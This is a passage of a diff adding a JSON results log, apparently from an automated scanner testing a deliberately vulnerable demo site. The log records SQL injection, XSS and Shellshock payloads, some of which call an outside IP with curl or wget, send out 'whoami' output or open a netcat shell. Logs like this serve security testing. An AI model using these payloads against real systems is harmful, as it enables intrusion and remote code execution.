+        "detected_at": "2026-02-07 16:31:55",
+        "unix_timestamp": 1770478315
+      }
+    },
+    {
+      "id": 135,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2150
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:56",
+        "unix_timestamp": 1770478316
+      }
+    },
+    {
+      "id": 136,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "1' ORDER BY 1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2153
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:56",
+        "unix_timestamp": 1770478316
+      }
+    },
+    {
+      "id": 137,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "1' ORDER BY 10--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2154
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:56",
+        "unix_timestamp": 1770478316
+      }
+    },
+    {
+      "id": 138,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "admin'--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2142
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:57",
+        "unix_timestamp": 1770478317
+      }
+    },
+    {
+      "id": 139,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2169
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:57",
+        "unix_timestamp": 1770478317
+      }
+    },
+    {
+      "id": 140,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "\"><script>alert(1)</script>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2166
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:57",
+        "unix_timestamp": 1770478317
+      }
+    },
+    {
+      "id": 141,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<IMG SRC=\"javascript:alert(1);\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2172
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:59",
+        "unix_timestamp": 1770478319
+      }
+    },
+    {
+      "id": 142,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<ScRiPt>alert(1)</sCrIpT>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2165
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:31:59",
+        "unix_timestamp": 1770478319
+      }
+    },
+    {
+      "id": 143,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<a href=\"javascript:alert(1)\">click</a>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2179
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:00",
+        "unix_timestamp": 1770478320
+      }
+    },
+    {
+      "id": 144,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2170
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:00",
+        "unix_timestamp": 1770478320
+      }
+    },
+    {
+      "id": 145,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<body onload=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2162
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:01",
+        "unix_timestamp": 1770478321
+      }
+    },
+    {
+      "id": 146,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<details open ontoggle=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2172
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:01",
+        "unix_timestamp": 1770478321
+      }
+    },
+    {
+      "id": 147,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<img src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2168
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:02",
+        "unix_timestamp": 1770478322
+      }
+    },
+    {
+      "id": 148,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2174
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:02",
+        "unix_timestamp": 1770478322
+      }
+    },
+    {
+      "id": 149,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<img src=x onerror=\"alert(1)\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2170
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:02",
+        "unix_timestamp": 1770478322
+      }
+    },
+    {
+      "id": 150,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<marquee onstart=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2166
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:03",
+        "unix_timestamp": 1770478323
+      }
+    },
+    {
+      "id": 151,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2169
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:03",
+        "unix_timestamp": 1770478323
+      }
+    },
+    {
+      "id": 152,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<script>alert(1)</script>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2165
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:04",
+        "unix_timestamp": 1770478324
+      }
+    },
+    {
+      "id": 153,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<svg onload=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2161
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:04",
+        "unix_timestamp": 1770478324
+      }
+    },
+    {
+      "id": 154,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "<video><source onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2172
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:05",
+        "unix_timestamp": 1770478325
+      }
+    },
+    {
+      "id": 155,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\\`nc -lvvp 1236 -e /bin/bash &\\`\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2219
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:05",
+        "unix_timestamp": 1770478325
+      }
+    },
+    {
+      "id": 156,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=5\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2219
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:06",
+        "unix_timestamp": 1770478326
+      }
+    },
+    {
+      "id": 157,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"sleep 1 && echo vulnerable 1\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2191
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:06",
+        "unix_timestamp": 1770478326
+      }
+    },
+    {
+      "id": 158,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2219
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:06",
+        "unix_timestamp": 1770478326
+      }
+    },
+    {
+      "id": 159,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"sleep 3 && echo vulnerable 3\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2191
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:07",
+        "unix_timestamp": 1770478327
+      }
+    },
+    {
+      "id": 160,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2219
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:07",
+        "unix_timestamp": 1770478327
+      }
+    },
+    {
+      "id": 161,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2219
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:08",
+        "unix_timestamp": 1770478328
+      }
+    },
+    {
+      "id": 162,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2219
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:08",
+        "unix_timestamp": 1770478328
+      }
+    },
+    {
+      "id": 163,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\\`whoami\\`\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2219
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:09",
+        "unix_timestamp": 1770478329
+      }
+    },
+    {
+      "id": 164,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "() { :;}; /bin/bash -c \"sleep 6 && echo vulnerable 6\"",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2191
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:09",
+        "unix_timestamp": 1770478329
+      }
+    },
+    {
+      "id": 165,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "a);/usr/bin/id;",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2152
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:09",
+        "unix_timestamp": 1770478329
+      }
+    },
+    {
+      "id": 166,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "a);/usr/bin/id",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2152
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:10",
+        "unix_timestamp": 1770478330
+      }
+    },
+    {
+      "id": 167,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "a;/usr/bin/id",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
